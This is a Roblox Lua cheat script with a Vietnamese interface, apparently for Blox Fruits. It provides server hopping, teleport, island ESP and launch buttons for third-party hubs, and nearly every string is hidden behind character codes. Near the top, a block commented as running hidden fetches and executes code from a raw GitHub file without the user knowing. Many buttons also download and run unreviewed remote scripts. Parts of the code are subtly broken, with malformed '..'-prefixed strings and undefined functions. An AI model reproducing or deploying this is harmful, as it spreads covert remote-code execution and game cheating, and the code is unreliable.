local Ntf = require(game:GetService(".."..string.char(82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101)).Ntf)
Ntf.new(".."..string.char(60,67,111,108,111,114,61,67,121,97,110,62,67,104,224,111,32,110,103,432,7901,105,32,273,7865,112,60,67,111,108,111,114,61,47,62)):Display()
wait(0.5)
Ntf.new(".."..string.char(60,67,111,108,111,114,61,89,101,108,108,111,119,62,258,110,32,99,417,109,32,99,104,432,97,32,110,103,432,7901,105,32,273,7865,112,60,67,111,108,111,114,61,47,62)):Display()
wait(1)
Ntf.new(".."..string.char(60,67,111,108,111,114,61,67,121,97,110,62,84,104,97,109,32,103,105,97,32,100,105,115,99,111,114,100,32,273,7875,32,110,104,7853,110,32,116,104,244,110,103,32,98,225,111,60,67,111,108,111,114,61,47,62)):Display()
wait(1)
Ntf.new(".."..string.char(60,67,111,108,111,114,61,89,101,108,108,111,119,62,67,104,250,99,32,99,225,99,32,98,7841,110,32,115,7917,32,100,7909,110,103,32,118,117,105,32,118,7867,60,67,111,108,111,114,61,47,62)):Display()
wait(1)
repeat
    wait()
until game.Players.LocalPlayer
-- Chức năng tự động chạy ẩn khi UI được bật
spawn(function()
    -- Load mã từ URL
    loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,100,105,101,109,113,117,121,47,65,117,116,111,99,104,97,116,109,105,122,117,104,97,114,97,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,102,97,115,116,104,117,121,37,50,48,46,116,120,116)))()
    
    -- Vòng lặp task liên tục
    while task.wait() do
        -- Click với tốc độ cực nhanh
        Click(0.000000000000000000000000000000004)
    end
end)

local SGui = Instance.new(".."..string.char(83,71,117,105))
local IBtn = Instance.new(".."..string.char(73,66,116,110))
local UCrn = Instance.new(".."..string.char(85,67,114,110))

SGui.Parent = game.CoreGui
SGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

IBtn.Parent = SGui
IBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
IBtn.BorderSizePixel = 0
IBtn.Position = UDim2.new(0.10615778, 0, 0.16217947, 0)
IBtn.Size = UDim2.new(0, 40, 0, 40)
IBtn.Draggable = true
IBtn.Image = ".."..string.char(104,116,116,112,58,47,47,119,119,119,46,114,111,98,108,111,120,46,99,111,109,47,97,115,115,101,116,47,63,105,100,61,56,48,53,51,53,51,49,52,53,56,53,56,51,50)

UCrn.CornerRadius = UDim.new(1, 10) 
UCrn.Parent = IBtn

IBtn.MouseButton1Down:Connect(function()
    game:GetService(".."..string.char(86,105,114,116,117,97,108,73,110,112,117,116,77,97,110,97,103,101,114)):SendKeyEvent(true, Enum.KeyCode.End, false, game)
end)

local Fluent = loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,100,97,119,105,100,45,115,99,114,105,112,116,115,47,70,108,117,101,110,116,47,114,101,108,101,97,115,101,115,47,108,97,116,101,115,116,47,100,111,119,110,108,111,97,100,47,109,97,105,110,46,108,117,97)))()
repeat wait() until game:IsLoaded()
local Window = Fluent:CreateWindow({
    Title = ".."..string.char(84,114,7849,117,32,82,111,98,108,111,120),
    SubTitle = ".."..string.char(32,32,32,91,65,117,116,111,32,72,111,112,93),
    TabWidth = 160,
    Size = UDim2.fromOffset(500, 320),
    Acrylic = true,
    Theme = ".."..string.char(68,97,114,107,101,114),
    MinimizeKey = Enum.KeyCode.End
})
local T = {
Srv=Window:AddTab({ Title=".."..string.char(84,97,98,32,73,110,102,111) }),
  Sts=Window:AddTab({ Title=".."..string.char(84,97,98,32,83,101,114,118,101,114) }),
  M=Window:AddTab({ Title=".."..string.char(84,97,98,32,72,111,112) }),
  Itm=Window:AddTab({Title = ".."..string.char(84,97,98,32,77) }),
  Tpl=Window:AddTab({Title = ".."..string.char(84,97,98,32,77,105,114,97,103,101) }),
}
local Discord = T.Srv:AddSection(".."..string.char(84,101,108,101,71,114,97,109))
T.Srv:AddButton({
        Title=".."..string.char(84,114,7849,117,32,82,111,98,108,111,120),
        Description=".."..string.char(68,105,115,99,111,114,100),
        Callback=function()
            setclipboard(tostring(".."..string.char(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,103,103,47,75,54,106,88,78,85,69,66,121,69))) 
        end
})
T.Srv:AddButton({
    Title=".."..string.char(89,84,32,58,32,84,114,7849,117,32,82,111,98,108,111,120),
    Description=".."..string.char(272,259,110,103,32,107,253,32,107,234,110,104,32,273,105,32,110,103,432,7901,105,32,273,7865,112),
    Callback=function()
        setclipboard(tostring(".."..string.char(104,116,116,112,115,58,47,47,119,119,119,46,121,111,117,116,117,98,101,46,99,111,109,47,64,84,114,97,117,114,111,98,108,111,120,50,48,48,52)))
    end
})
local Credits = T.Srv:AddSection(".."..string.char(67,114,101,100,105,116,115))
T.Srv:AddParagraph({
    Title=".."..string.char(84,114,7849,117,32,82,111,98,108,111,120,32,8226,32,79,110,121,120),
    Description=".."..string.char(91,76,117,97,32,53,48,37,32,45,32,80,104,112,47,72,116,109,108,32,55,48,37,32,45,32,80,121,32,53,48,37,93),
    Callback=function()
    end
})
local Time = T.Sts:AddParagraph({
    Title=".."..string.char(84,104,7901,105,32,71,105,97,110),
    Content=".."..string.char()
})
local function UpdateLocalTime()
    local date = os.date(".."..string.char(42,116))
    local hour = date.hour % 24
    local ampm = hour<12 and ".."..string.char(65,77) or ".."..string.char(80,77)
local formattedTime = string.format(".."..string.char(37,48,50,105,58,37,48,50,105,58,37,48,50,105,32,37,115), ((hour-1) % 12)+1, date.min, date.sec, ampm)
    local formattedDate = string.format(".."..string.char(37,48,50,100,47,37,48,50,100,47,37,48,52,100), date.day, date.month, date.year)
    local LocalizationService = game:GetService(".."..string.char(76,111,99,97,108,105,122,97,116,105,111,110,83,101,114,118,105,99,101))
    local Players = game:GetService(".."..string.char(80,108,97,121,101,114,115))
    local player = Players.LocalPlayer
    local name = player.Name
    local regionCode = ".."..string.char(85,110,107,110,111,119,110)
    local success, code=pcall(function()
        return LocalizationService:GetCountryRegionForPlayerAsync(player)
    end)
    if success then
        regionCode=code
    end
    Time:SetDesc(formattedDate .. ".."..string.char(45) .. formattedTime .. ".."..string.char(32,91,32) .. regionCode .. ".."..string.char(32,93))
end
spawn(function()
    while true do
        UpdateLocalTime()
        game:GetService(".."..string.char(82,117,110,83,101,114,118,105,99,101)).RenderStepped:Wait()
    end
end)
local ServerTime = T.Sts:AddParagraph({
    Title=".."..string.char(84,104,7901,105,32,71,105,97,110,32,77,225,121,32,67,104,7911),
    Content=".."..string.char()
})
local function UpdateServerTime()
    local GameTime = math.floor(workspace.DistributedGameTime+0.5)
    local Hour = math.floor(GameTime/(60^2)) % 24
    local Minute = math.floor(GameTime/60) % 60
    local Second = GameTime % 60
    ServerTime:SetDesc(string.format(".."..string.char(37,48,50,100,32,84,105,7871,110,103,45,37,48,50,100,32,80,104,250,116,45,37,48,50,100,32,71,105,226,121), Hour, Minute, Second))
end
spawn(function()
    while task.wait() do
        pcall(UpdateServerTime)
    end
end)
local Input = T.Sts:AddInput(".."..string.char(73,110,112,117,116), {
        Title=".."..string.char(74,111,98,32,73,68),
        Default=".."..string.char(),
        Placeholder=".."..string.char(68,225,110,32,73,68,32,83,101,114,118,101,114,32,86,224,111,32,272,226,121),
        Numeric=false, 
        Finished=false, 
        Callback=function(Value)
            _G.Job=Value
        end
    })
    T.Sts:AddButton({
        Title=".."..string.char(84,104,97,109,32,71,105,97,32,74,111,98,32,73,68),
        Description=".."..string.char(74,111,105,110,32,73,100,32,83,101,114,118,101,114,32,71,97,109,101),
        Callback=function()
            game:GetService(".."..string.char(84,101,108,101,112,111,114,116,83,101,114,118,105,99,101)):TeleportToPlaceInstance(game.placeId,_G.Job, game.Players.LocalPlayer)
        end
    })
    T.Sts:AddButton({
        Title=".."..string.char(83,97,111,32,67,104,233,112,32,73,68,32,83,101,114,118,101,114),
        Description=".."..string.char(67,111,112,121,32,73,100,32,83,101,114,118,101,114,32,71,97,109,101),
        Callback=function()
            setclipboard(tostring(game.JobId))
        end
    })
    local Toggle = T.Sts:AddToggle(".."..string.char(77,121,84,111,103,103,108,101), {Title=".."..string.char(83,112,97,109,32,74,111,105,110,32,74,111,98,32,73,68), Default=false })
    Toggle:OnChanged(function(Value)
  _G.Join=Value
        end)
        spawn(function()
while wait() do
if _G.Join then
game:GetService(".."..string.char(84,101,108,101,112,111,114,116,83,101,114,118,105,99,101)):TeleportToPlaceInstance(game.placeId,_G.Job, game.Players.LocalPlayer)
end
end
end)
T.Sts:AddButton({
    Title=".."..string.char(84,104,97,109,32,71,105,97,32,76,7841,105,32,77,225,121,32,67,104,7911),
    Description=".."..string.char(),
    Callback=function()
        game:GetService(".."..string.char(84,101,108,101,112,111,114,116,83,101,114,118,105,99,101)):Tpl(game.PlaceId, game:GetService(".."..string.char(80,108,97,121,101,114,115)).LocalPlayer)
    end
})
T.Sts:AddButton({
    Title=".."..string.char(272,7893,105,32,77,225,121,32,67,104,7911),
    Description=".."..string.char(),
    Callback=function()
        Hop()
    end
})
function Hop()
    local PlaceID = game.PlaceId
    local AllIDs = {}
    local foundAnything = ".."..string.char()
    local actualHour = os.date(".."..string.char(33,42,116)).hour
    local Deleted = false
    function TPReturner()
    local Site;
        if foundAnything==".."..string.char() then
            Site=game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
        else
            Site=game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
        end
        local ID = ".."..string.char()
        if Site.nextPageCursor and Site.nextPageCursor ~=".."..string.char(110,117,108,108) and Site.nextPageCursor ~=nil then
            foundAnything=Site.nextPageCursor
        end
        local num = 0;
        for i,v in pairs(Site.data) do
            local Possible = true
            ID=tostring(v.id)
            if tonumber(v.maxPlayers)>tonumber(v.playing) then
                for _,Existing in pairs(AllIDs) do
                    if num ~=0 then
                        if ID==tostring(Existing) then
                            Possible=false
                        end
                    else
                        if tonumber(actualHour) ~=tonumber(Existing) then
                            local delFile = pcall(function()
                                AllIDs={}
                                table.insert(AllIDs, actualHour)
                            end)
                        end
                    end
                    num=num+1
                end
                if Possible==true then
                    table.insert(AllIDs, ID)
                    wait()
                    pcall(function()
                        wait()
                        game:GetService(".."..string.char(84,101,108,101,112,111,114,116,83,101,114,118,105,99,101)):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                    end)
                    wait()
                end
            end
        end
    end
    function Tpl() 
        while wait() do
            pcall(function()
                TPReturner()
                if foundAnything ~=".."..string.char() then
                    TPReturner()
                end
            end)
        end
    end
    Tpl()
end

local AutoHop = T.M:AddSection(".."..string.char(72,111,112))
T.M:AddButton({
    Title=".."..string.char(72,111,112,32,70,117,108,108,32,77,111,111,110),
    Description=".."..string.char(49,48,48,37,32,115,101,114,118,101,114,32,102,117,108,108,32,109,111,111,110),
    Callback=function()
wait(1.0)  loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,115,104,105,110,105,99,104,105,45,100,122,47,115,104,105,110,104,111,112,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,102,117,108,108,109,111,111,110,46,108,117,97,37,50,48,40,49,41,46,116,120,116)))()
    end
})

T.M:AddButton({
    Title=".."..string.char(72,111,112,32,78,101,97,114,32,70,117,108,108,32,77,111,111,110),
    Description=".."..string.char(84,104,432,7901,110,103,32,116,114,259,110,103,32,52,47,53,32,104,111,7863,99,32,51,47,53),
    Callback=function()
wait(1.0)  loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,115,104,105,110,105,99,104,105,45,100,122,47,115,104,105,110,104,111,112,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,110,101,97,114,45,102,117,108,108,109,111,111,110,46,108,117,97,37,50,48,40,49,41,46,116,120,116)))()
    end
})

T.M:AddButton({
    Title=".."..string.char(72,111,112,32,84,97,109,32,75,105,7871,109),
    Description=".."..string.char(72,234,110,32,116,104,236,32,99,242,110,32,107,104,244,110,103,32,116,104,236,32,116,104,7857,110,103,32,107,104,225,99,32,109,117,97),
    Callback=function()
        wait(1.0)
        -- Chạy đoạn loadstring đầu tiên
        loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,103,105,97,111,116,114,105,110,104,104,111,99,47,65,112,105,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,83,97,105,115,105,46,116,120,116)))()
        
        wait(1.0)  -- Đợi 1 giây trước khi chạy đoạn thứ hai
        -- Chạy đoạn loadstring thứ hai
        loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,103,105,97,111,116,114,105,110,104,104,111,99,47,65,112,105,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,83,104,105,122,117,46,116,120,116)))()
        
        wait(1.0)  -- Đợi 1 giây trước khi chạy đoạn thứ ba
        -- Chạy đoạn loadstring thứ ba
        loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,103,105,97,111,116,114,105,110,104,104,111,99,47,65,112,105,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,79,114,111,115,104,105,46,116,120,116)))()
    end
})

T.M:AddButton({
    Title=".."..string.char(72,111,112,32,272,7843,111,32,66,237,32,7848,110),
    Description=".."..string.char(67,243,32,116,104,7875,32,109,7845,116,32,104,111,7863,99,32,116,114,7901,105,32,118,7915,97,32,115,225,110,103,32,116,104,236,32,273,7893,105,32,115,118),
    Callback=function()
wait(1.0)  loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,103,105,97,111,116,114,105,110,104,104,111,99,47,65,112,105,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,77,105,114,97,103,101,46,116,120,116)))()
    end
})

T.M:AddButton({
    Title=".."..string.char(72,111,112,32,66,111,115,115,32,82,105,112),
    Description=".."..string.char(67,243,32,116,104,7875,32,109,7845,116,32,104,111,7863,99,32,98,7883,32,107,105,108,108,32,99,104,7871,116),
    Callback=function()
wait(1.0)  loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,111,98,102,97,108,99,104,120,47,65,112,105,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,82,105,112,46,116,120,116)))()
    end
})

T.M:AddButton({
    Title=".."..string.char(72,111,112,32,66,111,115,115,32,68,97,114,107),
    Description=".."..string.char(67,243,32,116,104,7875,32,109,7845,116,32,104,111,7863,99,32,98,7883,32,107,105,108,108,32,99,104,7871,116),
    Callback=function()
wait(1.0)  loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,111,98,102,97,108,99,104,120,47,65,112,105,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,68,97,114,107,46,116,120,116)))()
    end
})

T.M:AddButton({
    Title=".."..string.char(72,111,112,32,66,111,115,115,32,83,111,117,108,32,82,101,97,112,101,114),
    Description=".."..string.char(67,243,32,116,104,7875,32,109,7845,116,32,104,111,7863,99,32,98,7883,32,107,105,108,108,32,99,104,7871,116),
    Callback=function()
wait(1.0)  loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,115,104,105,110,105,99,104,105,45,100,122,47,115,104,105,110,104,111,112,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,115,111,117,108,114,101,97,112,101,114,46,108,117,97,37,50,48,40,49,41,46,116,120,116)))()
    end
})

T.M:AddButton({
    Title=".."..string.char(72,111,112,32,66,111,115,115,32,68,111,117,103,104),
    Description=".."..string.char(67,243,32,116,104,7875,32,109,7845,116,32,98,111,115,115,32,104,111,7863,99,32,98,7883,32,107,105,108,108,32,109,7845,116),
    Callback=function()
wait(1.0)  loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,115,104,105,110,105,99,104,105,45,100,122,47,115,104,105,110,104,111,112,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,100,111,117,103,104,37,50,48,107,105,110,103,46,108,117,97,117,46,116,120,116)))()
    end
})

local FarmBoss = T.Itm:AddSection(".."..string.char(77,105,115,99))

T.Itm:AddButton({
    Title=".."..string.char(82,101,108,122,32,72,117,98),
    Description=".."..string.char(272,97,110,103,32,98,7853,110,32,110,234,110,32,97,110,104,32,101,109,32,108,7845,121,32,116,7841,109,32,99,225,105,32,110,224,121,32,273,7875,32,107,105,108,108,32,98,111,115,115),
    Callback=function()
          loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,102,97,114,103,104,105,105,47,114,101,108,122,104,117,98,47,109,97,105,110,47,101,120,101,99,117,116,101,46,104,97,99,107), true))()
    end
})

T.Itm:AddButton({
    Title=".."..string.char(82,101,100,122,32,72,117,98),
    Description=".."..string.char(272,97,110,103,32,98,7853,110,32,110,234,110,32,97,110,104,32,101,109,32,108,7845,121,32,116,7841,109,32,99,225,105,32,110,224,121,32,273,7875,32,107,105,108,108,32,98,111,115,115),
    Callback=function()
        local Settings = {
            JoinTeam = ".."..string.char(80,105,114,97,116,101,115); -- Pirates/Marines
            Translator = true; -- true/false
          }
          
          loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,114,101,97,108,114,101,100,122,47,66,108,111,120,70,114,117,105,116,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,83,111,117,114,99,101,46,108,117,97)))(Settings)
    end
})

T.Itm:AddButton({
    Title=".."..string.char(84,104,101,32,66,105,108,108,68,101,118,32,72,117,98),
    Description=".."..string.char(272,97,110,103,32,98,7853,110,32,110,234,110,32,97,110,104,32,101,109,32,108,7845,121,32,116,7841,109,32,99,225,105,32,110,224,121,32,273,7875,32,107,105,108,108,32,98,111,115,115),
    Callback=function()
        loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,115,101,108,99,105,97,119,97,115,104,101,114,101,47,115,99,114,101,101,112,116,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,66,70,75,69,89,83,89,83),true))()
    end
})

T.Itm:AddButton({
    Title=".."..string.char(87,45,65,122,117,114,101),
    Description=".."..string.char(272,97,110,103,32,98,7853,110,32,110,234,110,32,97,110,104,32,101,109,32,108,7845,121,32,116,7841,109,32,99,225,105,32,110,224,121,32,273,7875,32,107,105,108,108,32,98,111,115,115),
    Callback=function()
        loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,97,112,105,46,108,117,97,114,109,111,114,46,110,101,116,47,102,105,108,101,115,47,118,51,47,108,111,97,100,101,114,115,47,98,54,98,51,54,99,101,99,52,55,51,97,48,100,100,52,56,101,97,98,51,53,98,56,50,55,50,98,50,51,56,52,46,108,117,97)))()
    end
})

T.Itm:AddButton({
    Title=".."..string.char(65,115,116,114,97,108,32,72,117,98),
    Description=".."..string.char(272,97,110,103,32,98,7853,110,32,110,234,110,32,97,110,104,32,101,109,32,108,7845,121,32,116,7841,109,32,99,225,105,32,110,224,121,32,273,7875,32,107,105,108,108,32,98,111,115,115),
    Callback=function()
        loadstring(game:HttpGet(".."..string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,79,118,101,114,103,117,115,116,120,50,47,77,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,66,108,111,120,70,114,117,105,116,115,95,50,53,46,104,116,109,108)))()
    end
})

local AutoMysticIsland = T.Tpl:AddToggle(".."..string.char(77,121,84,111,103,103,108,101), {Title=".."..string.char(66,97,121,32,116,7899,105,32,273,7843,111,32,98,237,32,7849,110), Default=false })
Toggle:OnChanged(function(Value)
    _G.MysticIsland = Value
end)

-- Hàm teleport đến nơi khác
function topos(Pos) -- Tween
    local Distance = (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
    if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
        game.Players.LocalPlayer.Character.Humanoid.Sit = false
    end

    pcall(function()
        local tween = game:GetService(".."..string.char(84,119,101,101,110,83,101,114,118,105,99,101)):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Distance / 350, Enum.EasingStyle.Linear),
            {CFrame = Pos + Vector3.new(0, 50, 0)} -- Thêm chiều cao để bay cao hơn
        )
        tween:Play()

        if Distance <= 350 then
            tween:Cancel()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Pos + Vector3.new(0, 50, 0) -- Đảm bảo bay cao hơn khi đến gần
        end

        if _G.StopTween == true then
            tween:Cancel()
            _G.Clip = false
        end
    end)
end

-- Hàm di chuyển đến đảo bí ẩn
spawn(function()
    pcall(function()
        while wait() do
            if _G.MysticIsland then
                local mysticIsland = game:GetService(".."..string.char(87,111,114,107,115,112,97,99,101)).Map:FindFirstChild(".."..string.char(77,121,115,116,105,99,73,115,108,97,110,100))
                if mysticIsland then
                    local position = mysticIsland.WorldPivot.Position
                    topos(CFrame.new(position.X, 500, position.Z) + Vector3.new(0, 100, 0)) -- Tăng chiều cao khi di chuyển đến đảo
                end
            end
        end
    end)
end)

local AutoMysticIsland = T.Tpl:AddToggle(".."..string.char(77,121,84,111,103,103,108,101), {Title=".."..string.char(272,7883,110,104,32,118,7883,32,273,7843,111), Default=false })
Toggle:OnChanged(function(Value)
    _G.IslandESP = Value
end)

-- Hàm teleport đến nơi khác
function UpdateIslandESP()
    for i, v in pairs(game:GetService(".."..string.char(87,111,114,107,115,112,97,99,101))[".."..string.char(95,87,111,114,108,100,79,114,105,103,105,110)].Locations:GetChildren()) do
        pcall(function()
            if _G.IslandESP then
                if v.Name ~= ".."..string.char(83,101,97) then -- Lọc bỏ Sea nếu có
                    if not v:FindFirstChild(".."..string.char(73,115,108,97,110,100,69,83,80)) then
                        local bill = Instance.new(".."..string.char(66,105,108,108,98,111,97,114,100,71,117,105), v)
                        bill.Name = ".."..string.char(73,115,108,97,110,100,69,83,80)
                        bill.ExtentsOffset = Vector3.new(0, 1, 0)
                        bill.Size = UDim2.new(1, 200, 1, 30)
                        bill.Adornee = v
                        bill.AlwaysOnTop = true

                        local name = Instance.new(".."..string.char(84,101,120,116,76,97,98,101,108), bill)
                        name.Font = Enum.Font.GothamBold
                        name.TextSize = 14
                        name.TextWrapped = true
                        name.Size = UDim2.new(1, 0, 1, 0)
                        name.TextYAlignment = Enum.TextYAlignment.Top
                        name.BackgroundTransparency = 1
                        name.TextStrokeTransparency = 0.5
                        name.TextColor3 = Color3.new(1, 1, 1) -- Màu trắng cho tên
                    end
                    v.IslandESP.TextLabel.Text = (v.Name .. ".."..string.char(32,32,32,92,110) .. round((game:GetService(".."..string.char(80,108,97,121,101,114,115)).LocalPlayer.Character.Head.Position - v.Position).Magnitude) .. ".."..string.char(32,77))
                end
            else
                if v:FindFirstChild(".."..string.char(73,115,108,97,110,100,69,83,80)) then
                    v:FindFirstChild(".."..string.char(73,115,108,97,110,100,69,83,80)):Destroy()
                end
            end
        end)
    end
end
-- Hàm round để làm tròn số
local function round(n)
    return math.floor(tonumber(n) + 0.5)
end
-- Hàm di chuyển đến đảo bí ẩn
spawn(function()
    while wait(1) do
        if _G.IslandESP then
            UpdateIslandESP()
        end
    end
end)

local AutoMysticIsland = T.Tpl:AddToggle(".."..string.char(77,121,84,111,103,103,108,101), {Title=".."..string.char(66,97,121,32,116,7899,105,32,103,101,97,114), Default=false })
Toggle:OnChanged(function(Value)
    _G.TweenMGear = Value
end)

-- Hàm teleport đến nơi khác
function topos(Pos) -- Tween
    local Distance = (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
    if game.Players.LocalPlayer.Character.Humanoid.Sit == true then 
        game.Players.LocalPlayer.Character.Humanoid.Sit = false 
    end
    pcall(function() 
        tween = game:GetService(".."..string.char(84,119,101,101,110,83,101,114,118,105,99,101)):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Distance / 350, Enum.EasingStyle.Linear),
            {CFrame = Pos}
        )
    end)
    tween:Play()
    
    if Distance <= 350 then
        tween:Cancel()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Pos
    end

    if _G.StopTween == true then
        tween:Cancel()
        _G.Clip = false
    end
end
-- Hàm di chuyển đến đảo bí ẩn
spawn(function()
    pcall(function()
        while wait() do
            if _G.TweenMGear then
                if game:GetService(".."..string.char(87,111,114,107,115,112,97,99,101)).Map:FindFirstChild(".."..string.char(77,121,115,116,105,99,73,115,108,97,110,100)) then
                    for i, v in pairs(game:GetService(".."..string.char(87,111,114,107,115,112,97,99,101)).Map.MysticIsland:GetChildren()) do
                        if v:IsA(".."..string.char(77,101,115,104,80,97,114,116)) and v.Material == Enum.Material.Neon then
                            topos(v.CFrame)
                        end
                    end
                end
            end
        end
    end)
end)

local AutoMysticIsland = T.Tpl:AddToggle(".."..string.char(77,121,84,111,103,103,108,101), {Title=".."..string.char(66,97,121,32,116,7899,105,32,244,110,103,32,98,225,110,32,116,114,225,105), Default=false })
Toggle:OnChanged(function(Value)
    _G.Miragenpc = Value
end)

-- Hàm teleport đến nơi khác
function topos(Pos) -- Tween
    local Distance = (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
    if game.Players.LocalPlayer.Character.Humanoid.Sit == true then 
        game.Players.LocalPlayer.Character.Humanoid.Sit = false 
    end
    pcall(function() 
        tween = game:GetService(".."..string.char(84,119,101,101,110,83,101,114,118,105,99,101)):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Distance / 350, Enum.EasingStyle.Linear),
            {CFrame = Pos}
        )
    end)
    tween:Play()

    if Distance <= 350 then
        tween:Cancel()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Pos
    end

    if _G.StopTween == true then
        tween:Cancel()
        _G.Clip = false
    end
end
-- Hàm di chuyển đến đảo bí ẩn
spawn(function()
    while wait() do
        if _G.Miragenpc then
            local advancedFruitDealer = game.ReplicatedStorage.NPCs:FindFirstChild(".."..string.char(65,100,118,97,110,99,101,100,32,70,114,117,105,116,32,68,101,97,108,101,114))
            if advancedFruitDealer and advancedFruitDealer:IsA(".."..string.char(77,111,100,101,108)) then
                local dealerPosition = advancedFruitDealer.PrimaryPart and advancedFruitDealer.PrimaryPart.Position
                if dealerPosition then
                    topos(CFrame.new(dealerPosition))
                end
            end
        end
    end
end)

local Togglelockmoon =
              T.Tpl:AddToggle(".."..string.char(84,111,103,103,108,101,108,111,99,107,109,111,111,110), {Title = ".."..string.char(76,111,99,107,32,77,111,111,110,32,97,110,100,32,85,115,101,32,82,97,99,101,32,83,107,105,108,108), Default = false})
          Togglelockmoon:OnChanged(
              function(Value)
                  _G.AutoLockMoon = Value
              end
          )
          Options.Togglelockmoon:SetValue(false)

          spawn(
              function()
                  while wait() do
                      pcall(
                          function()
                              if _G.AutoLockMoon then
                                  local moonDir = game.Lighting:GetMoonDirection()
                                  local lookAtPos = game.Workspace.CurrentCamera.CFrame.p + moonDir * 100
                                  game.Workspace.CurrentCamera.CFrame =
                                      CFrame.lookAt(game.Workspace.CurrentCamera.CFrame.p, lookAtPos)
                              end
                          end
                      )
                  end
              end
          )

          spawn(
              function()
                  while wait() do
                      pcall(
                          function()
                              if _G.AutoLockMoon then
                                  game:GetService(".."..string.char(86,105,114,116,117,97,108,73,110,112,117,116,77,97,110,97,103,101,114)):SendKeyEvent(true, ".."..string.char(84), false, game)
                                  wait(0.1)
                                  game:GetService(".."..string.char(86,105,114,116,117,97,108,73,110,112,117,116,77,97,110,97,103,101,114)):SendKeyEvent(false, ".."..string.char(84), false, game)
                              end
                          end
                      )
                  end
              end
          )